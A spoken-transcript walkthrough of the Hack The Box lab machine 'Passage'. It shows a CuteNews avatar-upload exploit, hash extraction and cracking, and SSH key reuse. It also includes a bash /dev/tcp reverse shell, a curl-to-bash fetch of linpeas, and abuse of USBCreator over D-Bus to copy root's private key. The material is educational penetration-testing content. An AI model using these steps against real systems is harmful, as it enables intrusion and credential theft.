 what's going on youtube this is ipsec i'm doing passage from hack the box which was a super fun box that had a lot of small steps but as long as your recon game was on point each step shouldn't have taken too long it starts off with finding a website and identifying it runs a software called cute news looking at the exploits you can see that it's vulnerable to a image upload vulnerability through the avatar but you can just use search point download exploit run it and get a shell without even knowing what you're doing looking at the cute news you enumerate it to pull the hashes of the users of the website and realize one of those users also has a shell account and the password is the same so you use su to switch over to him and he shares ssh keys with another user on the box so you grab that stage key and ssh into the box and as that user you can dig around and you notice the vim history file and the vim history is editing the usb creator software to be able to be ran from the pseudo users instead of root which lets you read and write files as root so you can just grab root's ssh key using usb creator copy it to whatever directory you want and log into the box so with all that being said let's jump in as always we're going to start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory but first we have to create that directory call it passage and then the ip address of 10 10 10 206 and since i haven't ran this already i'm going to add the dash v flag i have done this machine once before like earlier in the day but i didn't really prepare to do this video because it is one o'clock on a friday and i post these videos at 10 o'clock on saturday so i have less than 24 hours to get this done and when you consider the like image thumbnail some encoding the video and uploading to youtube generally takes about four hours i have very little time to get this done so hopefully the video doesn't suffer looking at the results of the nmap we do have two ports open ssh on port 22 its banner tells us it's a ubuntu server we also have http on port 80. its banner tells us it's apache httpd2418 and i believe just from this information we can tell this is i think xenial let's just google um launchpad apache 2418 go to this package and this build is annual so most likely we are running xenial let's look at the actual page so if we go to 10 10 10 208 uh wait is it 208 to 206. it's 206. i don't know why i said 208 there but i got it right in my nmap scan since ports came back awesome uh we do have this page that says passage news and a lot of lorem ipsum stuff which is just generic text that means nothing but there is one thing implemented fail to ban so looking at this it's just saying failed to be an exist on the server and generally when this happens i won't bother with like go busting it because i don't want to get banned because if i get banned i'll be sad for a few days or a few minutes i guess uh at the very bottom we do see it is powered by cute news and there is a copyright of 2020 and it is 2021 so um copyright is old that being said this box did come out in 2020 so maybe the copyright isn't old for when the box came out the very first thing i always test when i see like this id parameter is i put a single quote and see what happens uh we get an article can't be found so i'm going to do a single quote and then um a comment and sql and we still can't get the article i'm going to change that single quote to be a double quote and then i'm going to get rid of quotes altogether and it's always cannot find article with id 11. so i'm going to go to article 10 article 9 is that still phil wait what okay that is weird every article i do oh wait eight did not nine ten and eleven all went to this failed abandon page okay i don't understand what is going on there but if we go to eight i'm gonna try eight plus one and it can't find article with id eight so i was just testing if like math worked because if it went to article nine we know we have some type of like eval or something happening if we force the application to do math maybe we can force it to do something else so i'm at a dead end there if we go to this rss feed it's the same exact thing but i'm going to take a look at um cute news so i'm going to google cute news github and the very first thing i generally do is i go i look at ways i could potentially identify the version so we have this readme.md and license.txt so i'm going to try readme.md and license.text so nothing there if we wanted to spend a lot of time enumerating the version we could potentially go in here and find something that changes periodically maybe they change like the jquery version something with javascript and then just find all the versions of cute news that javascript changed md5 sum the javascript and then md5 the javascript on passage news and compare but we've done that before i forget what video it's one of my super old videos um let's see ipsec dot rocks i'm going to search like version java okay now i don't have an indexed maybe by the time this video is uploaded i'll find it and fix the index so you can see it but until then uh yeah hopefully my description made sense so since we can't really find the version what we're going to do is just blindly throw exploits so let's do search point cute news and see what we have there is a rce on cute news two one two so let's do a search boy dash x to look at this exploit and also it looks like two one two is like the latest version exploit dbs which is good for us uh let's fix up our typo and we can see this is a 2019 cve 2020 um date posted so this does have some promise if we look through the source let's open this up let's mirror it and then open up in vim so we have some syntax highlighting because that's always good and we can get a brief idea of what script does by quickly going over it so we are setting up a python request session here and then the payload is going to be an image so gif 8 these are the magic bytes for a gif and then it just stands up a simple php reverse shell so we have this function uh extract credentials and then there's a function called register and then send payload so i'm going to go to the end of the script to see exactly what this does first it's going to attempt to run this extract credentials then it's going to run register and then payload awesome so weirdly enough it looks like you can extract the credentials before logging in by that logic that is odd so it's just going to ipq news see data users lines uh 10 10 10 206 acute news users see data lines uh cute news see data users lines cute news see data then users lines and we get a bunch of hashes i don't know why that failed but we got something um if we see i did not know this before uh this could be even quick so we got base64 there we got invalid input because there is a space so let's grab this one echo-n paste this base64-d a different user uh this maybe there's just no um passwords in this let's grab this it's probably a better way to do this i wonder if i oh there we go we got a hash right there uh that's not at mods hash let's see why is it hitting base64 invalid thing but you could go through this and decode all the base64 and i wonder if we could just go to cyber chef if this makes it easier because we can probably find where the bad characters are and then just put line breaks to easily do it so from base64 send it here oh it's just magical it says okay well it aired we're gonna try to start this base64 thing over again and give you everything so we're gonna do this real quick and then we're gonna actually gonna step through the exploit um i didn't realize it was that easy if you just go to that file uh if we go back to cute news uh let's see i think it said like 2.0 is like secure maybe not uh starting with 2.0 we've improved capacity speed and security of the cms that's kind of funny that you can just go to a file okay so what i want to do was do output dot text and we have all this if we look at output uh it's php objects so we could probably find a way to import this in php but i see pass and then 64 it's a string so if you go to my like php deserialization you'll know password string 64 characters so this is probably 64 character hash we can verify that with echo dash n and then wc-c 64. and hashes are always going to be um what is it a through f i think and then zero through seven i was doing them ahead like a b c d e f um but yeah so f is the last one what we can do is count this output and then grep op because this is going to be overpowered and then a through z i think it's just a i think it's a dash c zero through nine and then output dot text and we'd specify 64 characters like that and then it's gonna grip and like i said overpowered only show us the matches so we have a few hashes right here so with just grabbing that file we were able to get password hashes uh hashes.txt so what we're going to do is do it i guess the intended way and step through the exploit and use this exploit so that was a fun little side rant i shouldn't go on those when i'm so little on time but oh well can't help it so we're registering our user here and it doesn't look like anything is too interesting remember all the way at the top there is this um payload equals and the image so we're looking for payload we could do a search for payload but i like stepping through the code it's doing a token so it looks like some type of cross site request forgery check here um and then scrolling down we have this avatar file and it's putting our username or something here logged user and then payload so this is just a simple image upload we're replacing our avatar or a logo for a user with a exploit so we kind of have an idea how that works so let's go back all the way to the top it's using python sessions so we can actually do ses dot proxies update i think http http 127.001.8080. and this needs to be a dictionary because you could specify like if you wanted https afterwards and specify where that proxy is so that's a dictionary value put that in and i think this will now go to my burp suite so python three four eight eight zero uh we have to update or open burp suite let's come on open always takes so long to open when you're waiting on it as with all applications yeah my license gonna expire soon starting the project proxy yeah we want to intercept okay so let's run this and see if i updated the code correctly so http 101010 206. and we see a little red dot above my screen so we are intercepting i'm going to uh what is it change request do intercept response to this request because it's saying um it didn't extract hashes from this when we did so we can see there are definitely lots of hashes i guess if we actually download the source we would have seen these calls that separates the base64 so it would have been even easier if on this page i did like ctrl u to view source and saw that and then i could just grab these out and do like four line in and get a better base64 decrypt but oh well so we see this for some reason it can't here it is registering a random string for the user and password and email then it's going to get this i'm guessing it's trying to get the session token or the cross-site request forgery token and here we're doing a post to the index to update our avatar and for the avatar file this is the logged user we have our exploit so we for this we go back here and we have a shell so if we just do ls it's going to send it to our php uh shell or like whatever we dropped that one file that has the execute command and runs it so we can do this the downside to this is it's not interactive every time we run something it's going to restart a bash and i really do not like that so we're going to get a reverse shell so nc lvmp 9001 and had a good habit let's run uh let's see webshell.log and now we can do nzlvnp9001 and i just did that so every command i'm going to type down here is gonna be logged to a file it's just good habit to do that so bash dash c bash dash i dev tcp 10 10 14 i am four port 9001 0 and 1 is a reverse shell that we like using and we now have a shell so i'm going to do python3 dash c import pty pty dot spawn bin bash and then we can do control z s t t y raw minus echo hit f g enter twice so f g enter enter and now we have a shell that we have like um tab article and things i'm also going to export term to x term so now i can clear the screen and then we will notice like my terminal is kind of screwed up if like i'm going to end of the line and it keeps going back and like this not going to the next line so let's fix that real quick i'm going to go to a blank pane i'm going to do stty dash a and we want 34 and 136. that's rows and columns so stty rows 34 calls 136 and now when i do this it's fixed and we'll go down to the next line so definitely does help to clear up your shell uh let's see the very first thing i want to do is let's see if we go to home awesome i'm gonna cat etsy pass wd see what dub dub dub data is crap dub dub dub uh no login so i was thinking if i was here and i make the ssh if i had the permission to do that and i had a shell i could just ssh into this box and clear up and get a better shell that way because even though this like netcat session is pretty good ssh would always be better so the very first thing i generally do whenever i get on is see if there's something i could have done on recon so i'm going to grab 2 1 2 r period type that over to less i just want to see files that contain 2 1 2 which is what i assume is the version i'm correct by the version uh security.php init.php uh these are like images so it doesn't look like there's any way i could have identified it was vulnerable so the next thing i want to do is probably grab any password i can out of the database we know there's a bunch of hashes that we already got through that see data users lines earlier but i want to see if there's like a database so i'm going to do find dot grep conf and i'm looking for config and we got two so we got the c data comp.php if we cut it base64 that looks bad like such a weird way for this application to work so it's got this one line uh php die so the second line we want we can just do tail dash one conf.php base64-d we can see the contents of this file i don't know why cute news decides to base64 and code everything but it does um doesn't look like anything interesting uh if we go to config.php i wonder if we're going to do that same exact thing config.php we don't i'm going to grab i for pass to see if it has password it doesn't we can do find dot grep database and at this point i'm like there's no database ss lnpt and i don't see port 3306 or any type of database running we can also look at like grep sql and see if there's like a sql lite file there isn't so everything appears to be a flat file so maybe that's the benefit of cute news it's a cms that doesn't require a database it's just file based um there's this usersdb.php that looks interesting if we look at it you don't have access to open this file what okay let's go to users and this is where that lines file is and we can look at like 09.php uh cat209.php it's got that weird php die thing so we can just tail dash one base64-d and we get this so we want to probably go through all these php files we did find dot dash dash name star dot php and i think this has to be like that uh dash dash name equals i'm always i'm horrible with find for some reason there we go it's not dash dash it's just dash name i always screw up finds syntax so i'm gonna pipe this over actually let's do for i n find do tail dash one i so now it's going to tail every file type it over to base64-d and then we can say echo and done so now we have all the base64 catted uh we know this is going to be well that's more that's not a hash uh where's 64. 64. pass there we go so we know it's a 64 um like hex thing so again we can just pipe grep dash o p a to z 0 to 9 64 and get the hashes so it looks like we have more hashes than we did before v hashes.txt oh maybe we don't let's see that's five seven to thirteen yeah we have one more hash f66 4bd this d2 hash is new seven one e2 oh we have one more hash because our exploit created a user uh that's fine let's just sort dash u hashes.txt and let's try cracking these or we can identify it um 64 characters hexadecimal most likely is going to be sha256 but if you don't know you can just join hash identifier give it and it will say what it is probably shot 256 we can go over to hash cat if we wanted to but there's enough videos of that the very first step generally for like cracking hashes that you don't think are going to be too important it's just sending it over to a cloud service so let's go and search for hashes.org is this site still down maybe we all have to go to hashcat uh online hashcrack uh crackstation let's see if it's in crackstation we can paste it uh palm trees at this point hash cap may have been faster i hate captures so we have egress which i guess is one of the testers of this machine atlanta one and hacker if we go back in our burp suite and look at our history for register we can see was is there a password here oh no so i don't know what password hacker is so hacker and elena i don't know so we want to look at e7 d3 so let's see oh we just go back to a browser on this line ah it's base64 cyber chef e7 3d e7 d3 okay maybe that's the new hash uh crack station let's do e26 e 2 6. so this user is going to be paul um i don't know what that hacker user is maybe that is one we create and i just misread the source let's find it so what we're going to do is go back to our find command and we can do tail dash one base 64 dash d echo done grab this line so here's the hash uh let's see oh egress so i wonder if egress has two accounts egress at test.com and let's look at 4bd1 and it wouldn't be out of the ordinary for him to have two accounts because he's by testing if this box can be solved multiple times so yeah there is two passwords for him okay well at least we solved that um paul's password is atlanta one so what we can do is try ssh sh paul at 10 10 10 206 and we have uh permission denied public key we can try su-paul and log in and we do get in so we can't ssh because we don't have a public key um as i said we always want to upgrade to an ssh session so we go in dot ssh and see there's already an id rsa in idrsa.pub if we look at idrsa.pub uh the weird thing is it's owned by someone else uh nadav who is another user on this box if we cat etsy past wd and we can grep for every line that ends in sh because we want to know shells like the other shell would be sh instead of bin bash would be bin sh so that's why i just look at sh but we have root nadav and paul so if we go back to this idrc.pub it's weird that nadav has a key here if we look at authorized keys nadav can sshn and there is an id rsa which is the private key um what i want to do is take this private key and see if it matches this public key so ssh key gen y id rsa uh we need dash f for file and that's going to generate the public key for that private key if we now cat id rsa.pub we can see this and eyeballing it it looks like the same like it ends in 4 9 d and begins with a bunch of a's so looks fine but what i'm going to do is a printf command because printf will let me like put a line break in easily so i'm going to do printf and we're going to say the command ssh keygen id rsa and then we're going to say the command or backslash n to do a line break and then the command awk print one space two because we want to grab this and this and then remove this on id rsa uh yeah i think it's here rsa.pub like that and then end the printf so now it just prints two things so what we can do unique dash c to count and we see two so they are identical you can also do uh sort dash u and since it only splits out one it removes the unique but if you compare it against a lot of public keys the unique c would help you'd probably want to do sort then unique dash c because uniques only can compare each line to what's directly above and below it so if you do a sort first then all the uniques will be directly above and below but yep we have this which is the same so this ssh key probably goes to two different users so let's cut it out and we could just um ssh dash i i drsa the dove at 127.001 accept the key and get in that way but as i said i always like just ss aging for my bot so we could do id rsa and then ch mod plus 600 idrsa ssh actually let's move ideas a to nadav just to say organized dove at 10 10 10 206. uh specify the file there we go invalid format but it lets us in that invalid format is probably because it ends in a line break i don't know exactly what the invalid format is it's invalid but it reads the key anyways and lets us in so oh well won't hurt too much on it and we can get into nadab's profile so what we can do is lsla and look at the history and which is zero so bash history is removed from this box but there are other good files uh what is dmrc i don't even know what this one is uh probably desktop manager uh rc probably gets executed when it starts um examples desktop ice authority g-conf so this does have gnome installed it is a desktop there is a dot nano directory so let's go in here look at it nothing there pictures profile ssh we can look at ssh and see if there's anything interesting in authorized keys uh just nadovsky let's see we stopped at ssh series admin successful uh we can do sudo l we need his password which we don't know because we just sshed there is this vim info we can also do groups to see what group we are in we are in the sudo group so if we knew nadav's password we could probably sudo but we don't yet there is a vim info so if we look at vim info this does give some history of what this user was doing in vim so we can see like command line history uh he ran a search and replace and changed um admin identity's route to admin identity pseudo so he gave himself access to something i'm guessing this is the root group and he changed to pseudo which he is a member of and wq saved and quit i don't know what file that is if i had to guess it's going to be one of these if you've noticed vim always starts off where you left off this is why it's the file marks so we can kind of see his vim history of files he edited so i'm going to look at admin identities and those file marks so let's see if i just grab for this like maybe i have to escape that vim and fell sweet i was looking for starts the line with a single quote so we can grab admin ident on this file to see if it exists it does not and we can grab admin ident on the next file and it does exist here so this is the file he changed this usb creator is odd so i'm going to do two things i'm going to run lin p's and then look at what usb creator is if we do ps ef grab i usb uh it doesn't show up but yeah let's do that let's run lin p's so we have something running in the background while we do some research so make dirt dub dub dub cd dub dub dub cp opt privilege escalation script suite limpese when ps.sh copy it here and we want to start a web service so python3 dash m http server and we can curl 10 10 14 4 win ps.sh pipe it over to bash specify port 8000 okay that's running so now we can say usb creator i'm going to say proves uh we have a few things um exploit db has something this blogspot has something in 2015 2019 has something and hack tricks has something hack tricks is probably going to be my go-to so let's see ubuntu desktop utilizes dbus as its ipc mediator so it's kind of just a way for processes to talk to each other and let's see he's talking about how he used dbus to look at it let's see is there a ctl list interface vulnerable scenario oh yeah if you want to go to another one the video ouch is where we um talk about d-bus a lot uh there's so many things that happen in hack the box so this was hack the box was exporting a custom dbos thing see this was the old one usb creator so this is sending um let's see this was 2015 of it sending it a library to load where we're overwriting ld preload with this so since we overwrite ld preload it will run the next time like an aslr binaries are not aslr uh dynamically linked binaries ran and then execute uh but it says it is patched there was another one oh this palo alto one so if you read this whole article it does give you kind of a poc at the end and essentially what this is allowing us to do is interact with usb creator and have it call a command and the purpose of usb creator is to like convert an iso to a usb drive so you can boot at least that's what i've used it for and it's kind of a weird proves this is one of those that's going to be like maybe a version of uac because if we were if we had the password to this user we could just sudo l and probably been bash but we don't know the password however um this application is letting us bypass that it's giving us root like privilege without the password so we're gonna do gd bus call dash dash system destination com ubuntu usb creator to send it to that daemon object path com ubuntu usb creator uh usb creator fingers method and here's the method we're calling out of that we're calling usb creator image and then it's essentially taking a file and copying a file so com ubuntu usb creator dot image and we have to take a file and we want to copy it somewhere um we can try etsy shadow to dev shm shadow true recap dev shm shadow we could now potentially crack the passwords but these are um sha 512 crypt which it'll take us a while to crack them i was hesitant to do hash cap before because i was just lazy not because it would take a long time but this time it will actually take a long time we can try like root ssh id rsa dev shm root key to see if root has a private key in its directory cat this and we do so we have this idrsa key we can grab it and let's see if we can ssh with it so go up v root paste the key chmod 600 root ssh dash i root and root at 10 10 10 206 and we have root of the box so now we are root on this so hope you guys enjoyed the video take care and i will see you all next week